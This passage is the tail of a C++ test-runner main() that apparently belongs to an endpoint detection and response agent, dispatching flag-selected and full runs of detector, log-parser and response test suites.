        std::cout << "telemetry metrics tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--auto-response") == 0) {
        try {
            TestAutoResponseConfigStrictAtomic();
            TestAutoResponderGating();
            TestAutoResponseLedgerRestart();
        } catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "auto response tests passed\n";
        return 0;
    }
    if (argc == 2 && std::strcmp(argv[1], "--detection-rules") == 0) {
        try {
            TestMitreAttackMapping();
            TestProductionDetectionRules();
            TestLolbinProductionRules();
            TestPersistenceProductionRules();
            TestWmiProductionRules();
            TestKernelCallbacksProductionRules();
            TestLateralMovementProductionRules();
            TestAntiForensicsProductionRules();
            TestThinEventProductionRules();
            TestNewEventTypeProductionRules();
            TestDefenseEvasionProductionRules();
            TestPowerShellProductionRules();
            RunSilverFoxTests();
            RUN_SUITE(RunInjectionChainDetectorTests);
            RUN_SUITE(RunAttackChainDetectorTests);
            RUN_SUITE(RunC2BeaconDetectorTests);
            RUN_SUITE(RunRansomBurstDetectorTests);
            RUN_SUITE(RunDnsBeaconDetectorTests);
            RUN_SUITE(RunLateralMovementDetectorTests);
            RUN_SUITE(RunRegistryPersistenceDetectorTests);
            RUN_SUITE(RunAntiForensicsDetectorTests);
            RUN_SUITE(RunTimeChangeDetectorTests);
            RUN_SUITE(RunPrivilegedGroupDetectorTests);
            RUN_SUITE(RunLogonBruteForceDetectorTests);
            RUN_SUITE(RunPasswordSprayDetectorTests);
            RUN_SUITE(RunKerberoastDetectorTests);
            RUN_SUITE(RunProcessHollowingDetectorTests);
RUN_SUITE(RunMemoryScannerDetectorTests);
RUN_SUITE(RunDriverLoadDetectorTests);
RUN_SUITE(RunCanaryDetectorTests);
RUN_SUITE(RunHookPersistenceDetectorTests);
RUN_SUITE(RunTaskAbuseDetectorTests);
RUN_SUITE(RunMasqueradeDetectorTests);
RUN_SUITE(RunAccessibilityHijackDetectorTests);
RUN_SUITE(RunAvTamperDetectorTests);
RUN_SUITE(RunTimestompDetectorTests);
RUN_SUITE(RunObfuscationDetectorTests);
RUN_SUITE(RunLsassDumpDetectorTests);
            RUN_SUITE(RunFilelessAttackDetectorTests);
            RUN_SUITE(RunApiHookDetectorTests);
            RUN_SUITE(RunRemoteAccessDetectorTests);
            RUN_SUITE(RunCredentialDumpingDetectorTests);
            RUN_SUITE(TestNewPersistExecProductionRules);
            RUN_SUITE(RunDataExfiltrationDetectorTests);
            RUN_SUITE(RunPrivilegeEscalationDetectorTests);
            RUN_SUITE(RunNtlmRelayDetectorTests);
            RUN_SUITE(RunBrowserTheftDetectorTests);
            RUN_SUITE(RunBrowserExtensionDetectorTests);
            RUN_SUITE(RunArchiveStagingDetectorTests);
            RUN_SUITE(RunBitsAbuseDetectorTests);
            RUN_SUITE(RunDohAbuseDetectorTests);
            RUN_SUITE(RunServiceInstallDetectorTests);
            RUN_SUITE(RunShadowCopyDetectorTests);
            RUN_SUITE(RunPersistenceBurstDetectorTests);
            RUN_SUITE(RunMailboxDelegateDetectorTests);
            RUN_SUITE(RunMailboxRuleDetectorTests);
            RUN_SUITE(RunLlmnrPoisonDetectorTests);
            RUN_SUITE(RunNetProviderPersistDetectorTests);
            RUN_SUITE(RunPasswordVaultDetectorTests);
            RUN_SUITE(RunArpPoisonDetectorTests);
            RUN_SUITE(RunDiskWipeDetectorTests);
            RUN_SUITE(RunBootProviderPersistDetectorTests);
            RUN_SUITE(RunCloudMetadataDetectorTests);
            RUN_SUITE(RunGppPasswordDetectorTests);
            RUN_SUITE(RunControlPanelProxyDetectorTests);
            RUN_SUITE(RunHiddenUserAccountDetectorTests);
            RUN_SUITE(RunPasswordPolicyDiscoveryDetectorTests);
            RUN_SUITE(RunMsiPackageInstallDetectorTests);
            RUN_SUITE(RunLogEnumerationDetectorTests);
            RUN_SUITE(RunAclAbuseDetectorTests);
            RUN_SUITE(RunAmsiBypassDetectorTests);
            RUN_SUITE(RunAppinitDllDetectorTests);
            RUN_SUITE(RunAsRepRoastDetectorTests);
            RUN_SUITE(RunCertAbuseDetectorTests);
            RUN_SUITE(RunCorProfilerHijackDetectorTests);
            RUN_SUITE(RunCredFileHuntDetectorTests);
            RUN_SUITE(RunDcsyncDetectorTests);
            RUN_SUITE(RunDevUtilProxyDetectorTests);
            RUN_SUITE(RunCmstpBypassDetectorTests);
            RUN_SUITE(RunFileAssocDetectorTests);
            RUN_SUITE(RunHiddenWindowDetectorTests);
            RUN_SUITE(RunOfficePersistDetectorTests);
            RUN_SUITE(RunShortcutPersistDetectorTests);
            RUN_SUITE(RunIndirectExecDetectorTests);
            RUN_SUITE(RunScreensaverPersistDetectorTests);
            RUN_SUITE(RunSvcPathAbuseDetectorTests);
            RUN_SUITE(RunServiceDllHijackDetectorTests);
            RUN_SUITE(RunDllSearchOrderDetectorTests);
            RUN_SUITE(RunSvcRecoveryDetectorTests);
            RUN_SUITE(RunComHijackDetectorTests);
            RUN_SUITE(RunWinlogonHijackDetectorTests);
            RUN_SUITE(RunMshtaAbuseDetectorTests);
            RUN_SUITE(RunDotnetProxyExecDetectorTests);
            RUN_SUITE(RunWslAbuseDetectorTests);
            RUN_SUITE(RunMsdtAbuseDetectorTests);
        RUN_SUITE(RunSoftwareDiscoveryDetectorTests);
        RUN_SUITE(RunNetShareDiscoveryDetectorTests);
        RUN_SUITE(RunNonstandardPortEgressDetectorTests);
            RUN_SUITE(RunIsoMountDetectorTests);
            RUN_SUITE(RunPsProfileDetectorTests);
            RUN_SUITE(RunFirewallRuleDetectorTests);
            RUN_SUITE(RunLocalAccountDetectorTests);
            RUN_SUITE(RunPpidSpoofDetectorTests);
            RUN_SUITE(RunNetDiscoveryDetectorTests);
            RUN_SUITE(RunHostProfileDetectorTests);
            RUN_SUITE(RunPrivateKeyDetectorTests);
            RUN_SUITE(RunShareChangeDetectorTests);
            RUN_SUITE(RunPeAnomalyTests);
            RUN_SUITE(RunDowngradeAttackDetectorTests);
            RUN_SUITE(RunDpapiAbuseDetectorTests);
            RUN_SUITE(RunEmailCollectionDetectorTests);
            RUN_SUITE(RunEtwScriptTamperDetectorTests);
            RUN_SUITE(RunForcedAuthDetectorTests);
            RUN_SUITE(RunGoldenTicketDetectorTests);
            RUN_SUITE(RunGpoAbuseDetectorTests);
            RUN_SUITE(RunHiddenArtifactsDetectorTests);
            RUN_SUITE(RunHistoryTamperDetectorTests);
            RUN_SUITE(RunHiveCopyDetectorTests);
            RUN_SUITE(RunHostsRedirectDetectorTests);
            RUN_SUITE(RunIisModuleDetectorTests);
            RUN_SUITE(RunInputSimulationDetectorTests);
            RUN_SUITE(RunLogonScriptPersistDetectorTests);
            RUN_SUITE(RunLsaPackageDetectorTests);
            RUN_SUITE(RunMotwBypassDetectorTests);
            RUN_SUITE(RunNetshHelperDetectorTests);
            RUN_SUITE(RunNetworkSniffingDetectorTests);
            RUN_SUITE(RunNtdsDitDetectorTests);
            RUN_SUITE(RunPassTheHashDetectorTests);
            RUN_SUITE(RunPasswordCrackingDetectorTests);
            RUN_SUITE(RunPathInterceptionDetectorTests);
            RUN_SUITE(RunRansomOpsDetectorTests);
            RUN_SUITE(RunRdpSessionHijackDetectorTests);
            RUN_SUITE(RunRegCredHuntDetectorTests);
            RUN_SUITE(RunRemoteExecDetectorTests);
            RUN_SUITE(RunSecbootTamperDetectorTests);
            RUN_SUITE(RunShimDbDetectorTests);
            RUN_SUITE(RunSignedBinaryAbuseDetectorTests);
            RUN_SUITE(RunSipHijackDetectorTests);
            RUN_SUITE(RunSshKeyPersistenceDetectorTests);
            RUN_SUITE(RunTicketCacheAbuseDetectorTests);
            RUN_SUITE(RunTokenImpersonationDetectorTests);
            RUN_SUITE(RunHandleGuardDetectorTests);
            RUN_SUITE(RunClipboardTheftDetectorTests);
            RUN_SUITE(RunNamedPipeAbuseDetectorTests);
            RUN_SUITE(RunWebExfilDetectorTests);
            RUN_SUITE(RunWifiCredTheftDetectorTests);
            RUN_SUITE(RunWinrmAbuseDetectorTests);
            RUN_SUITE(RunWinrmConfigTamperDetectorTests);
            RUN_SUITE(RunXslScriptDetectorTests);
            RUN_SUITE(RunEventlogTamperDetectorTests);
            RUN_SUITE(RunSshAbuseDetectorTests);
            RUN_SUITE(RunNewRuleDetectorsTests);
            RUN_SUITE(RunAuditChainRecoveryTests);
            RUN_SUITE(RunWebhookNotifierTests);
            RUN_SUITE(RunAlerterSinkTests);
            RUN_SUITE(RunTriagePackTests);
            RUN_SUITE(RunCryptominerDetectorTests);
            RUN_SUITE(RunAntiAnalysisDetectorTests);
            RUN_SUITE(RunScriptHostAbuseDetectorTests);
            RUN_SUITE(RunAccountOpDetectorTests);
            RUN_SUITE(RunTunnelToolDetectorTests);
            RUN_SUITE(RunSurveillanceDetectorTests);
            RUN_SUITE(RunWebshellDetectorTests);
            RUN_SUITE(RunUsbExfilDetectorTests);
            RUN_SUITE(RunPersistenceChainDetectorTests);
            RUN_SUITE(RunLolbinParentChildDetectorTests);
            RUN_SUITE(RunLolbinChainDetectorTests);
            RUN_SUITE(RunPowerShellDownloadExecuteDetectorTests);
            RUN_SUITE(RunDllHijackDetectorTests);
            RUN_SUITE(RunDefenseEvasionDetectorTests);
            RUN_SUITE(RunDiscoveryReconDetectorTests);
            RUN_SUITE(RunRegModifyDetectorTests);
            RUN_SUITE(RunWmiExecDetectorTests);
            RUN_SUITE(RunLocalCollectDetectorTests);
            RUN_SUITE(RunLateralTransferDetectorTests);
            RUN_SUITE(RunThreatIntelDetectorTests);
            RUN_SUITE(RunLateralChainDetectorTests);
            RUN_SUITE(RunCorrelationEngineTests);
            RUN_SUITE(RunRdpChainDetectorTests);
            RUN_SUITE(RunUacBypassDetectorTests);
            RUN_SUITE(RunWmiPersistenceDetectorTests);
            RUN_SUITE(RunRansomPrecursorDetectorTests);
            RUN_SUITE(RunRdpParserTests);
            RUN_SUITE(RunPortScanDetectorTests);
RUN_SUITE(TestNewEdrFeaturesProductionRules);
RUN_SUITE(TestNewGapProductionRules);
RUN_SUITE(TestNewDetectorProductionRules);
RUN_SUITE(TestMoreGapProductionRules);
RUN_SUITE(TestCanaryHookProductionRules);
RUN_SUITE(TestTamperDumpProductionRules);
RUN_SUITE(TestObfuscationProductionRules);
RUN_SUITE(TestWslMsdtIsoProductionRules);
RUN_SUITE(TestShadowCopyProductionRules);
RUN_SUITE(TestNewCredentialPersistenceRules);
RUN_SUITE(TestBrowserExtensionProductionRules);
            TestRegWatchTargetRuleAlignment();
        } catch (const std::exception& error) {
            std::cerr << error.what() << "\n";
            return 1;
        }
        std::cout << "detection rule tests passed\n";
        return 0;
    }
    if (argc != 1) {
        std::cerr << "usage: edr_native_tests [--browser-extension|--powershell|--startup-watch|--detection-rules|--credential-detectors|--clipboard-theft|--named-pipe-abuse|--gap-only|--telemetry-metrics|--health-snapshot|--response-path|--reporter-delivery|--telemetry-delivery|--telemetry-contract|--response-identity|--response-replay|--audit-recovery|--incident-correlation|--auto-response|--endpoint-identity|--incident-health|--reporter-spool]\n";
        return 2;
    }
    try {
    TestConfigDefault();
    TestReporterHealthMetrics();
    RunHealthSnapshotTests();
    RunTelemetryContractTests();
    RunTelemetryDeliveryIntegrationTests();
    RunReporterDeliveryTests();
    TestProcessCommandLineQuery();
TestAmsiConfigStrictAtomic();
    TestBeaconAndBurstConfigStrictAtomic();
    TestProcessHollowingConfigStrictAtomic();
    TestNewDetectorConfigStrictAtomic();
    TestBrowserExtensionConfigStrictAtomic();
    TestPersistChainConfigStrictAtomic();
    TestChainConfigStrictAtomic();
    TestRemoteAccessConfigStrictAtomic();
    TestLogonBruteConfigStrictAtomic();
    TestHooksConfigStrictAtomic();
    TestAmsiEligibilityAndDisabled();
    TestAmsiLifecycleAndMappings();
    TestAmsiBoundariesErrorsAndSerialization();
    TestAmsiStickyInitializationFailure();
    TestResponseConfigStrictAtomic();
    TestResponseProtocolAndSchema();
    TestQuarantineProtocolAndSchema();
    TestIsolationProtocolAndValidation();
    TestQuarantineConfigStrictAtomic();
    TestResponseServerQuarantineDryRun();
    TestResponseKeyAuditAndReplay();
    TestResponseAuditOutcomeCorrelation();
    TestResponseServerFailsClosedWithoutKey();
    TestResponseServerExecuteStopRace();
    TestResponseActionPolicySeams();
    TestResponseActionAuditAndOutcomeSeams();
    TestResponseDeleteFilePathPolicy();
    TestResponseDeleteFileIdentityBinding();
    TestResponseDeleteFileHandleBinding();
    TestResponseActionControlledChild();
    TestResponseActionTreeSeams();
    TestResponseActionTreeRejectsReusedChildPid();
    TestResponseTreeChildPolicySkips();
    TestResponseActionControlledTree();
    TestQuarantinePolicySeams();
    TestQuarantineSidecarCollisionRollback();
    TestQuarantineControlledFile();
    TestAutoResponseConfigStrictAtomic();
    TestAutoResponderGating();
    TestAutoResponseLedgerRestart();
    TestRegistrySnapshotOversizedValueContinues();
    TestConfigEnableSysmon();
    TestSysmonProcessCreate();
    TestSysmonProcessStop();
    TestExpandedSysmonEvents();
    TestSysmonProcessAccess();
    TestSysmonThreadCreate();
    TestSysmonStrictValidation();
    TestConfigRangeValidation();
    TestNewCollectorConfig();
    TestFileReputation();
    TestSemanticDedup();
    TestEventBusOverflowContract();
    TestMitreAttackMapping();
    TestProductionDetectionRules();
    RunSilverFoxTests();
    RunBehaviorEnricherTests();
    RunInjectionChainDetectorTests();
    RunAttackChainDetectorTests();
    RunC2BeaconDetectorTests();
    RunRansomBurstDetectorTests();
    RunDnsBeaconDetectorTests();
    RunLateralMovementDetectorTests();
    RunRegistryPersistenceDetectorTests();
    RunAntiForensicsDetectorTests();
    RunTimeChangeDetectorTests();
    RunPrivilegedGroupDetectorTests();
    RunLogonBruteForceDetectorTests();
    RunPasswordSprayDetectorTests();
    RunKerberoastDetectorTests();
    RunProcessHollowingDetectorTests();
    RunMemoryScannerDetectorTests();
    RunDriverLoadDetectorTests();
    RunFilelessAttackDetectorTests();
    RunApiHookDetectorTests();
    RunRemoteAccessDetectorTests();
    RunCredentialDumpingDetectorTests();
    RunDataExfiltrationDetectorTests();
    RunPrivilegeEscalationDetectorTests();
    RunNtlmRelayDetectorTests();
    RunBrowserTheftDetectorTests();
    RunBrowserExtensionDetectorTests();
    RunArchiveStagingDetectorTests();
    RunBitsAbuseDetectorTests();
    RunDohAbuseDetectorTests();
    RunServiceInstallDetectorTests();
    RunShadowCopyDetectorTests();
    RunPersistenceBurstDetectorTests();
    RunMailboxDelegateDetectorTests();
    RunMailboxRuleDetectorTests();
    RunLlmnrPoisonDetectorTests();
    RunNetProviderPersistDetectorTests();
    RunPasswordVaultDetectorTests();
    RunArpPoisonDetectorTests();
    RunDiskWipeDetectorTests();
    RunBootProviderPersistDetectorTests();
    RunWebhookNotifierTests();
    RunAlerterSinkTests();
    RunTriagePackTests();
    RunAclAbuseDetectorTests();
    RunAmsiBypassDetectorTests();
    RunAppinitDllDetectorTests();
    RunAsRepRoastDetectorTests();
    RunCertAbuseDetectorTests();
    RunCorProfilerHijackDetectorTests();
    RunCredFileHuntDetectorTests();
    RunDcsyncDetectorTests();
    RunDevUtilProxyDetectorTests();
    RunCanaryDetectorTests();
    RunHookPersistenceDetectorTests();
    RunMasqueradeDetectorTests();
    RunTaskAbuseDetectorTests();
    RunRegModifyDetectorTests();
    RunWmiExecDetectorTests();
    RunLocalCollectDetectorTests();
    RunLateralChainDetectorTests();
    RunLateralTransferDetectorTests();
    RunThreatIntelDetectorTests();
    RunCloudMetadataDetectorTests();
    RunGppPasswordDetectorTests();
    RunControlPanelProxyDetectorTests();
    RunHiddenUserAccountDetectorTests();
    RunPasswordPolicyDiscoveryDetectorTests();
    RunMsiPackageInstallDetectorTests();
    RunLogEnumerationDetectorTests();
    RunCmstpBypassDetectorTests();
    RunFileAssocDetectorTests();
    RunHiddenWindowDetectorTests();
    RunOfficePersistDetectorTests();
    RunShortcutPersistDetectorTests();
    RunIndirectExecDetectorTests();
    RunScreensaverPersistDetectorTests();
    RunSvcPathAbuseDetectorTests();
    RunServiceDllHijackDetectorTests();
    RunDllSearchOrderDetectorTests();
    RunSvcRecoveryDetectorTests();
    RunComHijackDetectorTests();
    RunWinlogonHijackDetectorTests();
    RunMshtaAbuseDetectorTests();
    RunDotnetProxyExecDetectorTests();
    RunWslAbuseDetectorTests();
    RunMsdtAbuseDetectorTests();
    RunSoftwareDiscoveryDetectorTests();
    RunNetShareDiscoveryDetectorTests();
    RunNonstandardPortEgressDetectorTests();
    RunIsoMountDetectorTests();
    RunPsProfileDetectorTests();
    RunFirewallRuleDetectorTests();
    RunLocalAccountDetectorTests();
    RunPpidSpoofDetectorTests();
    RunNetDiscoveryDetectorTests();
    RunHostProfileDetectorTests();
    RunPrivateKeyDetectorTests();
    RunShareChangeDetectorTests();
    RunPeAnomalyTests();
    RunDowngradeAttackDetectorTests();
    RunDpapiAbuseDetectorTests();
    RunEmailCollectionDetectorTests();
    RunEtwScriptTamperDetectorTests();
    RunForcedAuthDetectorTests();
    RunGoldenTicketDetectorTests();
    RunGpoAbuseDetectorTests();
    RunHiddenArtifactsDetectorTests();
    RunHistoryTamperDetectorTests();
    RunHiveCopyDetectorTests();
    RunHostsRedirectDetectorTests();
    RunIisModuleDetectorTests();
    RunInputSimulationDetectorTests();
    RunLogonScriptPersistDetectorTests();
    RunLsaPackageDetectorTests();
    RunMotwBypassDetectorTests();
    RunNetshHelperDetectorTests();
    RunNetworkSniffingDetectorTests();
    RunNtdsDitDetectorTests();
    RunPassTheHashDetectorTests();
    RunPasswordCrackingDetectorTests();
    RunPathInterceptionDetectorTests();
    RunRansomOpsDetectorTests();
    RunRdpSessionHijackDetectorTests();
    RunRegCredHuntDetectorTests();
    RunRemoteExecDetectorTests();
    RunSecbootTamperDetectorTests();
    RunShimDbDetectorTests();
    RunSignedBinaryAbuseDetectorTests();
    RunSipHijackDetectorTests();
    RunSshKeyPersistenceDetectorTests();
    RunTicketCacheAbuseDetectorTests();
    RunTokenImpersonationDetectorTests();
    RunHandleGuardDetectorTests();
    RunNamedPipeAbuseDetectorTests();
    RunWebExfilDetectorTests();
    RunWifiCredTheftDetectorTests();
    RunWinrmAbuseDetectorTests();
    RunWinrmConfigTamperDetectorTests();
    RunXslScriptDetectorTests();
    RunEventlogTamperDetectorTests();
    RunSshAbuseDetectorTests();
    RunNewRuleDetectorsTests();
    RunAuditChainRecoveryTests();
    RunResponseStreamReplayTests();
    RunEndpointIdentityTests();
    RunIncidentStoreHealthTests();
    RunReporterSpoolTests();
    TestCollectorRuntimeHealth();
    RunCryptominerDetectorTests();
    RunAntiAnalysisDetectorTests();
    RunScriptHostAbuseDetectorTests();
    RunAccountOpDetectorTests();
    RunTunnelToolDetectorTests();
    RunSurveillanceDetectorTests();
    RunWebshellDetectorTests();
    RunUsbExfilDetectorTests();
    RunPersistenceChainDetectorTests();
    RunLolbinParentChildDetectorTests();
    RunLolbinChainDetectorTests();
    RunPowerShellDownloadExecuteDetectorTests();
    RunDllHijackDetectorTests();
    RunDefenseEvasionDetectorTests();
    RunDiscoveryReconDetectorTests();
    RunRdpChainDetectorTests();
    RunUacBypassDetectorTests();
    RunWmiPersistenceDetectorTests();
    RunRansomPrecursorDetectorTests();
    RunRdpParserTests();
    RunPortScanDetectorTests();
    RunAvTamperDetectorTests();
    RunTimestompDetectorTests();
    RunObfuscationDetectorTests();
    RunLsassDumpDetectorTests();
    RunAccessibilityHijackDetectorTests();
#ifdef EDR_IMONITOR_AVAILABLE
    RunIMonitorMappingTests();
#endif
    TestSecurityLogParser4624();
    TestSecurityLogParser4625();
    TestSecurityLogParser4769();
    TestSecurityLogParser4672();
    TestNewPersistExecProductionRules();
    TestSecurityLogParser4720();
    TestSecurityLogParser4697();
    TestSecurityLogParser1102();
    TestSecurityLogParser1100();
    TestSecurityLogParser4722();
    TestSecurityLogParser4723();
    TestSecurityLogParser4724();
    TestSecurityLogParser4725();
    TestSecurityLogParser4726();
    TestSecurityLogParser4740();
    TestSecurityLogParserInvalid();
    TestWmiParser5860();
    TestWmiParser5857();
    TestWmiParser5858();
    TestWmiParser5859();
    TestWmiParser5861();
    TestWmiParserInvalid();
    TestWmiSemanticDedup();
    TestWmiProductionRules();
    TestKernelCallbacksProductionRules();
    TestLateralMovementProductionRules();
    TestAntiForensicsProductionRules();
    TestThinEventProductionRules();
    TestNewEventTypeProductionRules();
    TestDefenseEvasionProductionRules();
    TestTaskSchedulerParser106();
    TestTaskSchedulerParser140();
    TestTaskSchedulerParser141();
    TestTaskSchedulerParserInvalid();
    TestTaskSchedulerConfigStrictAtomic();
    TestPowerShellParser4104();
    TestPowerShellParserBoundsAndInvalid();
    TestPowerShellConfigStrictAtomic();
    TestPowerShellRedaction();
    TestPowerShellProductionRules();
    TestPowerShellReassembly();
    TestPowerShellReassemblyFailOpenAndBounds();
    TestPowerShellReassemblyConflictsAndEviction();
    TestPowerShellReassemblyTruncationRulesAndRedaction();
    TestPowerShellReassemblyUtf8AndReuse();
    TestPowerShellReassemblyTombstoneAndTerminalContracts();
    TestPowerShellReassemblyConcurrencyAndBus();
    TestLolbinProductionRules();
    TestNewEdrFeaturesProductionRules();
    TestNewGapProductionRules();
    TestNewDetectorProductionRules();
    TestMoreGapProductionRules();
    TestCanaryHookProductionRules();
    TestTamperDumpProductionRules();
    TestObfuscationProductionRules();
    TestShadowCopyProductionRules();
    TestNewCredentialPersistenceRules();
    TestBrowserExtensionProductionRules();
    TestRegWatchTargetRuleAlignment();
    TestStartupWatchConfig();
    TestStartupDirectoryCanonicalDedupe();
    TestProfileListDiscovery();
    TestStartupWatchCollector();
    TestPersistenceProductionRules();
    } catch (const std::exception& error) {
        std::cerr << error.what() << "\n";
        return 1;
    }
    std::cout << "native tests passed\n";
    return 0;
} 
